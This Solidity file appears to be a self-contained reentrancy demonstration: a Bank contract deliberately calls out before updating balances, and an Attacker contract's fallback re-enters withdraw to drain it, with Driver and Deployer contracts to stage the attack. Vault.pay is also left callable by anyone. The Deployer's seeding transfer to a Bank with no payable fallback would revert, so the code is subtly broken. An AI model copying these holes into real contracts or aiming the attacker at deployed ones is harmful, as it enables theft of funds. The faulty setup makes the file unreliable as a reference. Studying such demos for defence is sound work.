pragma solidity ^0.4.26;

contract Vault {
    uint256 public total;

    event Deposited(address from, uint256 value);
    event Withdrawn(address to, uint256 value);

    function() public payable {
        total += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    function pay(address to, uint256 value) public {
        require(address(this).balance >= value);
        to.call.value(value)();
        emit Withdrawn(to, value);
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Bank {
    mapping(address => uint256) public balances;
    Vault public vault;

    event Donated(address to, uint256 value);
    event Withdraw(address to, uint256 value);

    constructor(address _vault) public {
        vault = Vault(_vault);
    }

    function donate(address _to) public payable {
        balances[_to] += msg.value;
        address(vault).transfer(msg.value);
        emit Donated(_to, msg.value);
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {

            // ❌ Vulnerability: external call before state update
            vault.pay(msg.sender, _amount);

            balances[msg.sender] -= _amount;
            emit Withdraw(msg.sender, _amount);
        }
    }

    function balanceOf(address a) public view returns (uint256) {
        return balances[a];
    }
}

contract Attacker {
    Bank public bank;
    uint256 public attackAmount;
    bool public attacking;

    event Fallback(uint256 balance);
    event AttackStarted(uint256 amount);

    constructor(address _bank) public {
        bank = Bank(_bank);
    }

    function() public payable {
        emit Fallback(address(this).balance);

        if (attacking) {
            uint256 b = bank.balanceOf(address(this));
            if (b >= attackAmount) {
                bank.withdraw(attackAmount);
            }
        }
    }

    function attack(uint256 _amount) public payable {
        require(msg.value >= _amount);

        attackAmount = _amount;
        attacking = true;

        bank.donate.value(_amount)(address(this));
        emit AttackStarted(_amount);

        bank.withdraw(_amount);
        attacking = false;
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Driver {
    Attacker public attacker;

    constructor(address _attacker) public {
        attacker = Attacker(_attacker);
    }

    function attack(uint256 amt) public payable {
        attacker.attack.value(msg.value)(amt);
    }

    function attackerBalance() public view returns (uint256) {
        return attacker.balance();
    }
}

contract Deployer {
    function deploy() public payable
        returns (address vaultAddr, address bankAddr, address attackerAddr, address driverAddr)
    {
        Vault vault = new Vault();
        Bank bank = new Bank(address(vault));
        Attacker attacker = new Attacker(address(bank));
        Driver driver = new Driver(address(attacker));

        // Seed the system with ETH for meaningful reentrancy
        if (msg.value > 0) {
            address(bank).transfer(msg.value);
        }

        return (address(vault), address(bank), address(attacker), address(driver));
    }

    function() public payable {}
}

